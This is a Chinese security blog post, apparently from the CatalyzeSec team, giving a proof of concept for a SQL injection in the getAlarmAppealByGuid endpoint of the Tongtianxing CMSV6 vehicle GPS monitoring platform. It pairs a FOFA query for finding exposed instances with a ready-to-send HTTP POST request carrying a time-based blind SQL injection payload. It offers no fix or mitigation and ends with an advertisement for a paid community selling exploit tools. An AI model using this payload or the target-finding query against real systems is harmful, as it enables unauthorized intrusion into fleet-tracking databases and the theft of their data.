#  通天星CMSV6车载定位监控平台 getAlarmAppealByGuid SQL注入漏洞复现及POC   
原创 CatalyzeSec  CatalyzeSec   2024-09-10 19:34  
  
FOFA  
```
body="/808gps/" && icon_hash="1784259556"
```  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ylWhnOEubel0FrYOZXBJYeNibkN6Rxiau5VNicOyrpNs42feb358d9y4Bk5V6kpXCQvDxbEI0Dz1Hd9g/640?wx_fmt=other&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ylWhnOEubel0FrYOZXBJYeN3cGicIYbSpKFtSZQ9ramWbXvdBAuBfPm0XwbFEVU6rKorbvFsibpzuibw/640?wx_fmt=other&from=appmsg "")  
  
POC  
```
POST /alarm_appeal/getAlarmAppealByGuid;downloadLogger.action HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 71

guid=1') AND (SELECT 3904 FROM (SELECT(SLEEP(5)))PITq) AND ('qhqF'='qhqF
```  
  
nuclei运行结果  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ylWhnOEubel0FrYOZXBJYeNLoEn4bHNnbEW1yuEHr2sKoN4lDl20XT0HuDodFO1qWnTv314cprKfA/640?wx_fmt=other&from=appmsg "")  
  
nuclei-poc已上传到知识星球  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ylWhnOEubel0FrYOZXBJYeNTHSbTeZ1U00Ua6zTrEgEialpyMGufy1SlxU2XeZoyTNWL0vU2Z0OpOA/640?wx_fmt=other&from=appmsg "")  
  
高质量安全知识星球社区，致力于漏洞挖掘，渗透技巧，安全资料，星球承诺会持续更新0/1/NDay及对应的批量利用工具，团队内部漏洞库，内外网攻防技巧，你所需要的各类安全工具和资料以及团队师傅们最新的学习研究成果。分享行业内最新动态，解答交流各类技术问题。  
涉及方向包括Web渗透、免杀绕过、红蓝攻防、代码审计、应急响应、安全培训、CTF、小白入门、职业规划和疑难解答。**CatalyzeSec**  
，安全技术水平的催化者，星球针对成员的技术问题，快速提供思考方向及解决方案，并为星友提供多种方向的学习资料、安全工具、POC&EXP以及各种学习笔记等，以引导者和催化剂的方式助力安全技术水平的提升。  
我们是一个快速成长的team，团队的发展方向与每一位星友的学习方向密切相关，加入我们，一起成为更好的自己！  
PS：随着星球内知识的积累，人员的增加，  
星球价格也会随之增加，前一百位加入我们的师傅可享受99元朋友价！  
  
**团队内部独家知识库**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ylWhnOEubel0FrYOZXBJYeNGGJhK6ia0QWX5ibRUZOvcVMlMLwBgIDb0drK4qaLBVlrW71E5TQcrHPg/640?wx_fmt=other&from=appmsg "")  
  
